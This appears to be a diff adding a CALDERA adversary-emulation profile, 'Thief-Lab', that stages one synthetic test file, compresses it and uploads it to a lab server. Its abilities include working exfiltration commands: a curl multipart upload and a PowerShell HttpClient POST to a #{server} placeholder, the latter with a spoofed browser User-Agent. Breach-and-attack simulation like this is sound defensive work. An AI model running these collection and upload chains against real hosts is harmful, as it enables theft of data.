@@ -1,0 +1,121 @@
+id: 33906e88-8a4a-4b7a-a29d-c2b30d05d7e6
+name: Thief-Lab
+description: Collect and upload one synthetic BAS test file to the lab CALDERA server
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- 0ae51c4e-c546-469d-bdf9-0ace34556391
+- 1fd8b672-e336-49eb-86bc-8731368b451d
+- 50a40429-7a61-4a76-b8ff-600f3e7f8bff
+- 300157e5-f4ad-4569-b533-9d1fa0e74d74
+- ea713bc4-63f0-491c-9a6f-0b01d560b87e
+abilities:
+ 0ae51c4e-c546-469d-bdf9-0ace34556391:
+  name:  Create BAS lab staging directory
+  tactic:  collection
+  technique_name:  "Data Staged: Local Data Staging"
+  technique_id:  T1074.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $p = 'C:\BASLab\staged'; if (Test-Path -LiteralPath $p) { throw 'BAS staging directory already exists' }; (New-Item -ItemType Directory -Path $p -ErrorAction Stop).FullName
+ 1fd8b672-e336-49eb-86bc-8731368b451d:
+  name:  Find BAS lab file
+  tactic:  collection
+  technique_name:  "Data from Local System"
+  technique_id:  T1005
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $files = @(Get-ChildItem -LiteralPath 'C:\BASLab\input' -File -Filter '*.#{file.sensitive.extension}' -ErrorAction Stop); if ($files.Count -ne 1) { throw 'Expected exactly one synthetic test file' }; $files[0].FullName
+ 50a40429-7a61-4a76-b8ff-600f3e7f8bff:
+  name:  Stage BAS lab file
+  tactic:  collection
+  technique_name:  "Data Staged: Local Data Staging"
+  technique_id:  T1074.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $ErrorActionPreference = 'Stop'; $source = '#{host.file.path[filters(technique=T1005,max=1)]}'; $dir = '#{host.dir.staged[filters(max=1)]}'; if (-not (Test-Path -LiteralPath $source -PathType Leaf)) { throw "Source file missing: $source" }; if (-not (Test-Path -LiteralPath $dir -PathType Container)) { throw "Staging directory missing: $dir" }; $target = Join-Path -Path $dir -ChildPath (Split-Path -Path $source -Leaf); Copy-Item -LiteralPath $source -Destination $target -ErrorAction Stop; if (-not (Test-Path -LiteralPath $target -PathType Leaf)) { throw "Staged file missing: $target" }; Write-Output $target
+ 300157e5-f4ad-4569-b533-9d1fa0e74d74:
+  name:  Compress staged directory
+  tactic:  exfiltration
+  technique_name:  "Archive Collected Data: Archive via Utility"
+  technique_id:  T1560.001
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz
+   - sh:
+     platform: linux
+     command: |
+       tar -P -zcf #{host.dir.staged}.tar.gz #{host.dir.staged} && echo #{host.dir.staged}.tar.gz
+   - psh:
+     platform: windows
+     command: |
+       Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;
+       sleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select
+   - pwsh:
+     platform: windows
+     command: |
+       Compress-Archive -Path #{host.dir.staged} -DestinationPath #{host.dir.staged}.zip -Force;
+       sleep 1; ls #{host.dir.staged}.zip | foreach {$_.FullName} | select
+ ea713bc4-63f0-491c-9a6f-0b01d560b87e:
+  name:  Exfil staged directory
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over C2 Channel"
+  technique_id:  T1041
+  executors: 
+   - sh:
+     platform: darwin
+     command: |
+       curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+   - sh:
+     platform: linux
+     command: |
+       curl -F "data=@#{host.dir.compress}" --header "X-Request-ID: `hostname`-#{paw}" #{server}/file/upload
+   - psh:
+     platform: windows
+     command: |
+       $ErrorActionPreference = 'Stop';
+       $fieldName = "#{host.dir.compress}";
+       $filePath = "#{host.dir.compress}";
+       $url = "#{server}/file/upload";
+       
+       Add-Type -AssemblyName 'System.Net.Http';
+       
+       $client = New-Object System.Net.Http.HttpClient;
+       $content = New-Object System.Net.Http.MultipartFormDataContent;
+       $fileStream = [System.IO.File]::OpenRead($filePath);
+       $fileName = [System.IO.Path]::GetFileName($filePath);
+       $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+       $content.Add($fileContent, $fieldName, $fileName);
+       $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{paw}');
+       $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+       
+       $result = $client.PostAsync($url, $content).Result;
+       $result.EnsureSuccessStatusCode();
+   - pwsh:
+     platform: windows
+     command: |
+       $ErrorActionPreference = 'Stop';
+       $fieldName = "#{host.dir.compress}";
+       $filePath = "#{host.dir.compress}";
+       $url = "#{server}/file/upload";
+       
+       Add-Type -AssemblyName 'System.Net.Http';
+       
+       $client = New-Object System.Net.Http.HttpClient;
+       $content = New-Object System.Net.Http.MultipartFormDataContent;
+       $fileStream = [System.IO.File]::OpenRead($filePath);
+       $fileName = [System.IO.Path]::GetFileName($filePath);
+       $fileContent = New-Object System.Net.Http.StreamContent($fileStream);
+       $content.Add($fileContent, $fieldName, $fileName);
+       $client.DefaultRequestHeaders.Add("X-Request-Id", $env:COMPUTERNAME + '-#{paw}');
+       $client.DefaultRequestHeaders.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36");
+       
+       $result = $client.PostAsync($url, $content).Result;
+       $result.EnsureSuccessStatusCode();
